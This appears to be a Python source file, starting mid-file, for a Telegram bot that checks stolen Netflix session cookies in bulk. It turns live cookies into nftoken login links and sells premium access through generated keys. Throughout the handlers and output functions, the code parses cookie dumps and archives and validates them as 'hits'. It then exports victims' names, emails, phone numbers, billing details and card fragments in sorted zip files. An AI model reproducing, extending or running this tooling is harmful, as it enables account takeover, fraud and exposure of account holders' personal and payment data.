        [InlineKeyboardButton("🔑 Gen Key", callback_data="adm_genkey"),
         InlineKeyboardButton("📢 Broadcast", callback_data="adm_bc")],
        [InlineKeyboardButton("🚫 Ban", callback_data="adm_ban"),
         InlineKeyboardButton("✅ Unban", callback_data="adm_unban")],
        [InlineKeyboardButton("⭐ Grant Prem", callback_data="adm_prem"),
         InlineKeyboardButton("🔄 Reset", callback_data="adm_reset")],
        [InlineKeyboardButton("📥 Export Users", callback_data="adm_exp_users"),
         InlineKeyboardButton("📥 Export Keys", callback_data="adm_exp_keys")],
        [InlineKeyboardButton("⬅️ Back", callback_data="nav_menu")]])

def kb_result():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 .txt", callback_data="dl_txt"),
         InlineKeyboardButton("📦 .zip", callback_data="dl_zip")],
        [InlineKeyboardButton("🧹 Clean Dupes", callback_data="clean_dupes"),
         InlineKeyboardButton("📊 Plans", callback_data="show_plans")],
        [InlineKeyboardButton("⬅️ Menu", callback_data="nav_menu")]])

def kb_stop():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🛑 Stop & Save", callback_data="do_stop"),
        InlineKeyboardButton("❌ Cancel", callback_data="do_cancel")]])

# ── COMMANDS ──────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = get_user(uid, update.effective_user.username or "", update.effective_user.first_name or "")
    if ctx.args and ctx.args[0].startswith("ref_"):
        try: rid = int(ctx.args[0][4:])
        except: rid = None
        if rid and rid != uid and not u.get("referred_by"):
            u["referred_by"] = rid
            rk = str(rid)
            if rk in USERS:
                r = USERS[rk]
                if uid not in r.get("_rewarded_uids",[]):
                    r.setdefault("_rewarded_uids",[]).append(uid)
                    r.setdefault("referrals",[]).append(uid)
                    r["bonus_batches"] = r.get("bonus_batches",0) + 3
                    r["rewarded"] = r.get("rewarded",0) + 1
                    STATS["total_referrals"] = STATS.get("total_referrals",0) + 1
                    sj("stats.json", STATS)
            sj("users.json", USERS)
    await update.message.reply_html(p_start(u), reply_markup=kb_main())

async def cmd_chk(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = sess(update.effective_user.id); s["awaiting"] = "chk"
    await update.message.reply_html("🔍 <b>Check Mode</b>\n\nSend a cookie or NetflixId now.",
                                    reply_markup=kb_back())

async def cmd_batch(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = sess(update.effective_user.id); s["awaiting"] = "batch"
    await update.message.reply_html("📦 <b>Batch Mode</b>\n\nUpload <code>.txt</code> / <code>.zip</code> / <code>.rar</code> / <code>.7z</code>\nUp to 5 files.",
                                    reply_markup=kb_back())

async def cmd_extract(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = sess(update.effective_user.id); s["awaiting"] = "extract"
    await update.message.reply_html("🧲 <b>Extract Mode</b>\n\nPaste raw cookie dump.",
                                    reply_markup=kb_back())

async def cmd_gen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = sess(update.effective_user.id); s["awaiting"] = "gen"
    await update.message.reply_html("⚡ <b>Gen Mode</b>\n\nSend a cookie to get token.",
                                    reply_markup=kb_back())

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = sess(update.effective_user.id); s["stop"] = True
    STATS["stopped"] = STATS.get("stopped",0) + 1; sj("stats.json", STATS)
    await update.message.reply_html("🛑 Stopping after current batch...")

async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    s = sess(update.effective_user.id); s["stop"] = True
    STATS["cancelled"] = STATS.get("cancelled",0) + 1; sj("stats.json", STATS)
    await update.message.reply_html("❌ Cancelled.")

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_html(p_stats(), reply_markup=kb_back())

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = get_user(uid, update.effective_user.username or "", update.effective_user.first_name or "")
    if not ctx.args:
        await update.message.reply_html(p_redeem()); return
    key = ctx.args[0].strip()
    rec = KEYS.get(key)
    if not rec or rec.get("used_by"):
        await update.message.reply_text("❌ Invalid or used key."); return
    days = int(rec.get("days",3))
    base = datetime.fromisoformat(u["premium_until"]) if is_premium(u) else datetime.utcnow()
    u["premium_until"] = (base + timedelta(days=days)).isoformat()
    rec["used_by"] = uid; rec["used_at"] = datetime.utcnow().isoformat()
    STATS["authorized"] = STATS.get("authorized",0) + 1
    sj("users.json", USERS); sj("keys.json", KEYS); sj("stats.json", STATS)
    await update.message.reply_html(f"✅ Premium active for <b>{days} days</b>!")

async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Admin only."); return
    await update.message.reply_html(p_admin(), reply_markup=kb_admin())

async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Admin only."); return
    if not ctx.args:
        await update.message.reply_text("Usage: /genkey <days>"); return
    try: days = int(ctx.args[0])
    except: await update.message.reply_text("Days must be number."); return
    key = hashlib.sha256(os.urandom(16)).hexdigest()[:20].upper()
    KEYS[key] = {"days":days,"used_by":None,"created":datetime.utcnow().isoformat()}
    sj("keys.json", KEYS)
    await update.message.reply_html(f"🔑 <b>Key:</b> <code>{key}</code>\n📅 Days: <b>{days}</b>")

# ── CALLBACK ROUTER ───────────────────────────────────────────
async def cb_router(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    data = q.data
    u = get_user(uid, q.from_user.username or "", q.from_user.first_name or "")
    s = sess(uid)
    try: await q.answer()
    except: pass

    if data == "nav_menu":
        s["awaiting"] = None
        try: await q.edit_message_text(p_start(u), parse_mode="HTML", reply_markup=kb_main())
        except: pass
    elif data == "nav_plans":
        try: await q.edit_message_text(p_plans(u), parse_mode="HTML", reply_markup=kb_back())
        except: pass
    elif data == "nav_commands":
        try: await q.edit_message_text(p_commands(), parse_mode="HTML", reply_markup=kb_back())
        except: pass
    elif data == "nav_premium":
        try: await q.edit_message_text(p_premium(), parse_mode="HTML", reply_markup=kb_back())
        except: pass
    elif data == "nav_referral":
        try: await q.edit_message_text(p_referral(u), parse_mode="HTML", reply_markup=kb_back())
        except: pass
    elif data == "nav_help":
        try: await q.edit_message_text(p_help(), parse_mode="HTML", reply_markup=kb_back())
        except: pass
    elif data == "nav_supported":
        try: await q.edit_message_text(p_supported(), parse_mode="HTML", reply_markup=kb_back())
        except: pass
    elif data == "nav_about":
        try: await q.edit_message_text(p_about(), parse_mode="HTML", reply_markup=kb_back())
        except: pass
    elif data == "nav_stats":
        try: await q.edit_message_text(p_stats(), parse_mode="HTML", reply_markup=kb_back())
        except: pass
    elif data == "nav_redeem":
        s["awaiting"] = "redeem"
        try: await q.edit_message_text(p_redeem(), parse_mode="HTML", reply_markup=kb_back())
        except: pass
    elif data == "nav_close":
        try: await q.message.delete()
        except: pass
    elif data.startswith("wk_"):
        n = int(data.split("_")[1])
        u["workers"] = n; sj("users.json", USERS); s["workers"] = n
        cookies = s.get("pending") or []
        if cookies:
            try: await q.message.delete()
            except: pass
            asyncio.create_task(run_batch(q.message, uid, cookies, ctx, n))
        else:
            try: await q.edit_message_text(f"✅ Workers: <b>{n}</b>", parse_mode="HTML", reply_markup=kb_back())
            except: pass
    elif data == "batch_chk":
        cookies = s.get("pending") or []
        if not cookies:
            await q.answer("No cookies loaded."); return
        if not is_premium(u) and len(cookies) > FREE_CAP:
            cookies = cookies[:FREE_CAP]
            s["pending"] = cookies
        try: await q.edit_message_text(f"⚙️ <b>Choose workers ({len(cookies)} cookies):</b>",
                                        parse_mode="HTML", reply_markup=kb_workers(s.get("workers",3)))
        except: pass
    elif data == "batch_batch":
        cookies = s.get("pending") or []
        if not cookies:
            await q.answer("No cookies loaded."); return
        if not is_premium(u) and len(cookies) > FREE_CAP:
            cookies = cookies[:FREE_CAP]; s["pending"] = cookies
        try: await q.edit_message_text(f"⚙️ <b>Choose workers ({len(cookies)} cookies):</b>",
                                        parse_mode="HTML", reply_markup=kb_workers(s.get("workers",3)))
        except: pass
    elif data == "batch_extract":
        cookies = s.get("pending") or []
        ids = [c.get("NetflixId","") for c in cookies if c.get("NetflixId")]
        if not ids:
            await q.answer("No IDs."); return
        buf = io.BytesIO("\n".join(ids).encode())
        await q.message.chat.send_document(document=InputFile(buf, filename="netflix_ids.txt"),
                                           caption=f"🧲 {len(ids)} IDs extracted")
    elif data == "do_stop":
        s["stop"] = True
        STATS["stopped"] = STATS.get("stopped",0) + 1; sj("stats.json", STATS)
        await q.answer("🛑 Stopping & saving...", show_alert=True)
    elif data == "do_cancel":
        s["stop"] = True
        STATS["cancelled"] = STATS.get("cancelled",0) + 1; sj("stats.json", STATS)
        await q.answer("❌ Cancelled.", show_alert=True)
    elif data == "dl_txt":
        await send_txt(q, s)
    elif data == "dl_zip":
        await send_zip(q, s, ctx)
    elif data == "clean_dupes":
        await clean_dupes(q, s, ctx)
    elif data == "show_plans":
        await show_plans(q, s)
    elif data.startswith("adm_"):
        await admin_cb(q, uid, data, ctx)

async def admin_cb(q, uid, data, ctx):
    if uid != ADMIN_ID:
        await q.answer("🚫 Admin only."); return
    if data == "adm_users":
        await q.edit_message_text(f"👥 Total users: <b>{STATS.get('total_users',0)}</b>",
                                  parse_mode="HTML", reply_markup=kb_admin())
    elif data == "adm_stats":
        await q.edit_message_text(p_stats(), parse_mode="HTML", reply_markup=kb_admin())
    elif data == "adm_genkey":
        await q.edit_message_text("Use /genkey <days>", parse_mode="HTML", reply_markup=kb_admin())
    elif data == "adm_bc":
        await q.edit_message_text("Use /broadcast <text>", parse_mode="HTML", reply_markup=kb_admin())
    elif data == "adm_ban":
        await q.edit_message_text("Use /ban <uid>", parse_mode="HTML", reply_markup=kb_admin())
    elif data == "adm_unban":
        await q.edit_message_text("Use /unban <uid>", parse_mode="HTML", reply_markup=kb_admin())
    elif data == "adm_prem":
        await q.edit_message_text("Use /grant <uid> <days>", parse_mode="HTML", reply_markup=kb_admin())
    elif data == "adm_reset":
        for k in list(STATS.keys()):
            STATS[k] = 0 if isinstance(STATS[k], int) else None
        sj("stats.json", STATS)
        await q.edit_message_text("✅ Reset.", parse_mode="HTML", reply_markup=kb_admin())
    elif data == "adm_exp_users":
        buf = io.BytesIO(json.dumps(USERS, indent=2).encode())
        await q.message.chat.send_document(document=InputFile(buf, filename="users.json"))
    elif data == "adm_exp_keys":
        buf = io.BytesIO(json.dumps(KEYS, indent=2).encode())
        await q.message.chat.send_document(document=InputFile(buf, filename="keys.json"))
    await q.answer()

# ── TEXT HANDLER ──────────────────────────────────────────────
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = sess(uid)
    u = get_user(uid, update.effective_user.username or "", update.effective_user.first_name or "")
    aw = s.get("awaiting")
    text = update.message.text or ""
    if aw == "chk":
        cookies = parse_cookies(text); s["awaiting"] = None
        if not cookies:
            await update.message.reply_text("❌ No NetflixId found."); return
        await update.message.reply_chat_action("typing")
        r = await check_async(cookies[0])
        if r.get("ok"):
            td, _ = await gen_async(cookies[0])
            txt = format_hit(r, td, 1)
            buf = io.BytesIO(txt.encode())
            await ctx.bot.send_document(update.effective_chat.id,
                document=InputFile(buf, filename="hit.txt"),
                caption=f"💎 {r.get('name')} — {r.get('plan')}")
        else:
            await update.message.reply_html(f"❌ <b>{r.get('tag','err').upper()}</b>", reply_markup=kb_back())
    elif aw == "gen":
        cookies = parse_cookies(text); s["awaiting"] = None
        if not cookies:
            await update.message.reply_text("❌ No cookie."); return
        td, err = await gen_async(cookies[0])
        if td:
            link_pc = f"https://netflix.com/?nftoken={urllib.parse.quote(td['token'], safe='')}"
            link_ph = f"https://netflix.com/unsupported?nftoken={urllib.parse.quote(td['token'], safe='')}"
            await update.message.reply_html(
                f"⚡ <b>Token Generated</b>\n\n"
                f"<b>Raw:</b>\n<code>{td['token']}</code>\n\n"
                f"<b>PC:</b> <a href='{link_pc}'>Click</a>\n"
                f"<b>Phone:</b> <a href='{link_ph}'>Click</a>",
                reply_markup=kb_back())
        else:
            await update.message.reply_html(f"❌ {err}", reply_markup=kb_back())
    elif aw == "extract":
        ids = [m.group(1).strip("\"'") for m in NF_RE.finditer(text)]
        s["awaiting"] = None
        if not ids:
            await update.message.reply_text("❌ No IDs."); return
        buf = io.BytesIO("\n".join(ids).encode())
        await ctx.bot.send_document(update.effective_chat.id,
            document=InputFile(buf, filename="netflix_ids.txt"),
            caption=f"🧲 {len(ids)} IDs")
    elif aw == "redeem":
        key = text.strip(); rec = KEYS.get(key); s["awaiting"] = None
        if not rec or rec.get("used_by"):
            await update.message.reply_text("❌ Invalid or used key."); return
        days = int(rec.get("days",3))
        base = datetime.fromisoformat(u["premium_until"]) if is_premium(u) else datetime.utcnow()
        u["premium_until"] = (base + timedelta(days=days)).isoformat()
        rec["used_by"] = uid; rec["used_at"] = datetime.utcnow().isoformat()
        STATS["authorized"] = STATS.get("authorized",0) + 1
        sj("users.json", USERS); sj("keys.json", KEYS); sj("stats.json", STATS)
        await update.message.reply_html(f"✅ Premium active for <b>{days} days</b>!")
    else:
        cookies = parse_cookies(text)
        if cookies:
            r = await check_async(cookies[0])
            if r.get("ok"):
                await update.message.reply_html(f"✅ <b>LIVE</b> — {r.get('name')} ({r.get('plan')})", reply_markup=kb_back())
            else:
                await update.message.reply_html(f"❌ <b>{r.get('tag','err').upper()}</b>", reply_markup=kb_back())

# ── FILE HANDLER ──────────────────────────────────────────────
async def on_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = sess(uid)
    u = get_user(uid, update.effective_user.username or "", update.effective_user.first_name or "")
    doc = update.message.document
    if not doc: return
    name = doc.file_name.lower()
    if not name.endswith((".txt",".zip",".rar",".7z")):
        await update.message.reply_text("❌ Only .txt/.zip/.rar/.7z"); return
    f = await doc.get_file()
    data = await f.download_as_bytearray()
    if name.endswith(".zip"): cookies = from_zip(bytes(data))
    elif name.endswith(".rar"): cookies = from_rar(bytes(data))
    elif name.endswith(".7z"): cookies = from_7z(bytes(data))
    else: cookies = parse_cookies(bytes(data).decode("utf-8","ignore"))
    if not cookies:
        await update.message.reply_text("❌ No cookies found."); return
    uniq, dup = dedup(cookies)
    s["pending"] = uniq
    rem, cap = batches_left(u)
    cap_note = "" if is_premium(u) else f"\n🔒 Free cap: {FREE_CAP}/batch"
    await update.message.reply_html(
        f"✅ <b>File received: {doc.file_name}</b>\n\n"
        f"📊 Cookies: <b>{len(uniq)}</b>\n"
        f"🆔 Duplicates removed: <b>{dup}</b>\n"
        f"📁 Batches left: <b>{rem if not is_premium(u) else '∞'}</b>{cap_note}\n\n"
        "Reply to this message with:",
        reply_markup=kb_batch_actions())

# ── BATCH RUNNER ──────────────────────────────────────────────
async def run_batch(msg, uid, cookies, ctx, workers):
    s = sess(uid)
    u = get_user(uid)
    if not is_premium(u) and len(cookies) > FREE_CAP:
        cookies = cookies[:FREE_CAP]
    if s.get("busy"):
        await msg.reply_text("⚠️ Already running."); return
    s["busy"] = True; s["stop"] = False
    total = len(cookies)
    counts = {"paid":0,"free":0,"hold":0,"dead":0,"no_data":0,"timeout":0,"err":0,"no_id":0}
    retries = 0; hits = []
    start = time.time(); checked = 0; last_edit = 0

    STATS["total_batches"] = STATS.get("total_batches",0) + 1
    STATS["active_batches"] = STATS.get("active_batches",0) + 1
    sj("stats.json", STATS)

    prog = await msg.reply_text(
        f"⏳ <b>Batch Processing</b>\n\n📊 Progress: 0/{total}\n"
        f"✅ Hits: 0\n❌ Failed: 0\n📈 Hit Rate: 0.0%\n"
        f"👷 Workers: {workers}\n⏱ Speed: 0/s | ETA: --\n\n"
        f"Last Update: {datetime.utcnow().strftime('%H:%M:%S')}",
        parse_mode="HTML", reply_markup=kb_stop())

    sem = asyncio.Semaphore(workers); lock = asyncio.Lock()

    async def one(cd):
        nonlocal checked, retries, last_edit
        async with sem:
            r = await check_async(cd)
        async with lock:
            checked += 1
            retries += r.get("retries",0)
            tag = r.get("tag","err")
            counts[tag] = counts.get(tag,0) + 1
            if tag == "paid" and r.get("ok"):
                td, _ = await gen_async(cd)
                r["token_info"] = td or {}
                hits.append(r)
            now = time.monotonic()
            if now - last_edit >= 1.5 or checked == total:
                last_edit = now
                el = time.time() - start
                spd = checked/el if el > 0 else 0
                eta = (total-checked)/spd if spd > 0 else 0
                hr = (counts["paid"]/checked*100) if checked else 0
                try:
                    await prog.edit_text(
                        f"⏳ <b>Batch Processing</b>\n\n"
                        f"📊 Progress: {checked}/{total}\n"
                        f"✅ Hits: {counts['paid']}\n"
                        f"❌ Failed: {counts['dead']+counts['err']+counts['timeout']}\n"
                        f"📈 Hit Rate: {hr:.1f}%\n"
                        f"👷 Workers: {workers}\n"
                        f"⏱ Speed: {spd:.1f}/s | ETA: {int(eta)}s\n\n"
                        f"Last Update: {datetime.utcnow().strftime('%H:%M:%S')}",
                        parse_mode="HTML", reply_markup=kb_stop())
                except: pass
            if s.get("stop"): return

    await asyncio.gather(*[one(c) for c in cookies])

    s["busy"] = False
    s["hits"] = OrderedDict((f"H{i+1}", h) for i, h in enumerate(hits))
    STATS["active_batches"] = max(0, STATS.get("active_batches",1) - 1)
    STATS["checked"] += checked
    STATS["hits"] = STATS.get("hits",0) + counts["paid"]
    STATS["tokens"] = STATS.get("tokens",0) + counts["paid"]
    STATS["errors"] = STATS.get("errors",0) + counts["err"] + counts["timeout"]
    STATS["last_gen"] = datetime.utcnow().isoformat()
    sj("stats.json", STATS)
    u["batches_used"] = u.get("batches_used",0) + 1
    sj("users.json", USERS)

    el = time.time() - start
    hr = (counts["paid"]/checked*100) if checked else 0
    summary = (f"🎬 <b>ZIP Batch Complete!</b>\n\n"
               f"📁 Files: <b>{total}</b>\n"
               f"📊 Total: <b>{checked}</b>\n"
               f"💎 Hits: <b>{counts['paid']}</b>\n"
               f"❌ Failed: <b>{counts['dead']+counts['err']+counts['timeout']}</b>\n"
               f"📈 Hit Rate: <b>{hr:.1f}%</b>\n"
               f"👷 Workers: <b>{workers}</b>\n"
               f"⏱ Time: <b>{el:.0f}s</b>\n\n"
               f"✅ <b>Saving results...</b>")
    try: await prog.edit_text(summary, parse_mode="HTML")
    except: pass
    if counts["paid"] > 0:
        class FakeQ:
            def __init__(self, m): self.message = m
            async def answer(self, *a, **k): pass
        await send_zip(FakeQ(prog), s, ctx)

# ── OUTPUT ────────────────────────────────────────────────────
def flag(cc):
    if not cc or len(cc) != 2: return "🌍"
    return chr(0x1F1E6 + ord(cc[0].upper()) - 65) + chr(0x1F1E6 + ord(cc[1].upper()) - 65)

def format_hit(r, td, idx):
    now = datetime.utcnow()
    cc = r.get("country","XX")
    profs = r.get("profiles","N/A")
    tok = td.get("token","") if td else ""
    tok_safe = urllib.parse.quote(tok, safe="") if tok else ""
    link_pc = f"https://netflix.com/?nftoken={tok_safe}" if tok_safe else "N/A"
    link_ph = f"https://netflix.com/unsupported?nftoken={tok_safe}" if tok_safe else "N/A"
    return (f"💎 PREMIUM ACCOUNT 💎\n──────────────────────────\n\n"
            f"👥 Account Details\n"
            f"├ 🧑 Name: {r.get('name','N/A')}\n"
            f"├ 📧 Email: {r.get('email','N/A')}\n"
            f"├ 🌍 Country: {r.get('country_name','?')} {flag(cc)} ({cc})\n"
            f"├ 📦 Plan: {r.get('plan','N/A')}\n"
            f"├ 💰 Price: {r.get('price','N/A')}\n"
            f"├ 📆 Member Since: {r.get('member_since','N/A')}\n"
            f"├ 📅 Next Billing: {r.get('next_billing','N/A')}\n"
            f"├ 💳 Payment: {r.get('payment','N/A')}\n"
            f"├ 💳 Card: {r.get('card_brand','N/A')} •••• {r.get('card_last4','N/A')}\n"
            f"└ 📞 Phone: {r.get('phone','N/A')} ({'Yes' if r.get('phone_verified') else 'No'})\n\n"
            f"📺 Streaming Info\n"
            f"├ 🎞️ Quality: {r.get('quality','N/A')}\n"
            f"├ 📶 Streams: {r.get('streams','N/A')}\n"
            f"├ ⏸️ Hold Status: {'Yes' if r.get('hold') else 'No'}\n"
            f"├ 👫 Extra Member: {'Yes' if r.get('extra_slots',0) > 0 else 'No'}\n"
            f"└ 📎 Extra Slot: {r.get('extra_slots',0)}\n\n"
            f"✅ Account Status\n"
            f"├ 📨 Email Verified: N/A\n"
            f"├ 📌 Membership: {r.get('status','N/A')}\n"
            f"├ 👥 Profiles: {r.get('profile_count',0)}\n"
            f"└ 🎭 Names: {profs}\n\n"
            f"🔐 Token Information\n"
            f"├ ⏰ Generated: {now.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"├ 📅 Expires: {(now+timedelta(hours=1)).strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"├ ⏳ Remaining: 0d 1h 0m 0s\n"
            f"├ 📱 Phone Login:\n{link_ph}\n"
            f"└ 🖥️ PC Login:\n{link_pc}\n\n"
            f"🍪 NetflixID: NetflixId={r.get('cookie',{}).get('NetflixId','N/A')}\n\n"
            f"👑 Bot Owner: {OWNER}\n")

async def send_txt(q, s):
    hits = s.get("hits") or {}
    if not hits:
        await q.answer("No hits."); return
    txt = "\n\n".join(format_hit(h, h.get("token_info"), i) for i, (_, h) in enumerate(hits.items(),1))
    buf = io.BytesIO(txt.encode())
    await q.message.chat.send_document(document=InputFile(buf, filename="hits.txt"),
        caption=f"📄 {len(hits)} hits")

async def send_zip(q, s, ctx):
    hits = s.get("hits") or {}
    if not hits:
        await q.answer("No hits."); return
    buf = io.BytesIO()
    premium, free, third, extra, hold = [], [], [], [], []
    by_plan = {"BASIC":[],"STANDARD_WITH_ADS":[],"STANDARD_NO_ADS":[],"UHD_PREMIUM":[],"OTHER":[]}
    for _, h in hits.items():
        if h.get("tag") == "paid": premium.append(h)
        elif h.get("tag") == "free": free.append(h)
        elif h.get("tag") == "hold": hold.append(h)
        pf = h.get("plan_file","OTHER")
        by_plan.setdefault(pf,[]).append(h)
        if h.get("card_brand") and "N/A" not in h.get("card_brand",""):
            third.append(h)
        if h.get("extra_slots",0) > 0:
            extra.append(h)
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        def wr(name, arr):
            if arr:
                txt = "\n\n".join(format_hit(h, h.get("token_info"), i) for i, h in enumerate(arr,1))
                z.writestr(name, txt)
        wr("PREMIUM_ACTIVE.txt", premium)
        wr("FREE_PLAN.txt", free)
        wr("THIRD_PARTY.txt", third)
        wr("EXTRA_SLOT.txt", extra)
        wr("ON_HOLD.txt", hold)
        wr("ALL_HITS.txt", list(hits.values()))
        for plan, arr in by_plan.items():
            wr(f"by_plan/{plan}.txt", arr)
    buf.seek(0)
    total = len(hits)
    date = datetime.utcnow().strftime("%Y%m%d")
    await ctx.bot.send_document(
        q.message.chat.id,
        document=InputFile(buf, filename=f"cookies_{total}hits_{date}.zip"),
        caption=f"📦 {total} hits\n✅ FREE: {len(free)} | 💸 Third-Party: {len(third)} | 👥 Extra Slot: {len(extra)} | 💎 Premium (Active): {len(premium)}",
        reply_markup=kb_result())

async def clean_dupes(q, s, ctx):
    hits = s.get("hits") or {}
    if not hits:
        await q.answer("No hits."); return
    seen, uniq = set(), []
    for _, h in hits.items():
        fp = cookie_fp(h.get("cookie",{}))
        if fp in seen: continue
        seen.add(fp); uniq.append(h)
    txt = "\n\n".join(format_hit(h, h.get("token_info"), i) for i, h in enumerate(uniq,1))
    buf = io.BytesIO(txt.encode())
    await ctx.bot.send_document(q.message.chat.id,
        document=InputFile(buf, filename="clean_hits.txt"),
        caption=f"🧹 Cleaned: {len(uniq)} unique ({len(hits)-len(uniq)} dupes removed)")

async def show_plans(q, s):
    hits = s.get("hits") or {}
    plans = {}
    for _, h in hits.items():
        lbl = h.get("plan_label","Unknown")
        plans[lbl] = plans.get(lbl,0) + 1
    txt = "📊 <b>PLAN BREAKDOWN</b>\n─────────────────────\n\n"
    for p, n in sorted(plans.items(), key=lambda x: -x[1]):
        txt += f"{p}: <b>{n}</b>\n"
    txt += f"\nTotal: <b>{len(hits)}</b> hits"
    await q.edit_message_text(txt, parse_mode="HTML", reply_markup=kb_back())

# ── MAIN ──────────────────────────────────────────────────────
async def on_error(update, ctx):
    log.error("handler error: %s", ctx.error)

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_error_handler(on_error)
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("batch", cmd_batch))
    app.add_handler(CommandHandler("extract", cmd_extract))
    app.add_handler(CommandHandler("gen", cmd_gen))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CallbackQueryHandler(cb_router))
    app.add_handler(MessageHandler(filters.Document.ALL, on_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    print(f"{VERSION} running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True,
                    poll_interval=1.0, timeout=30)

if __name__ == "__main__":
    main()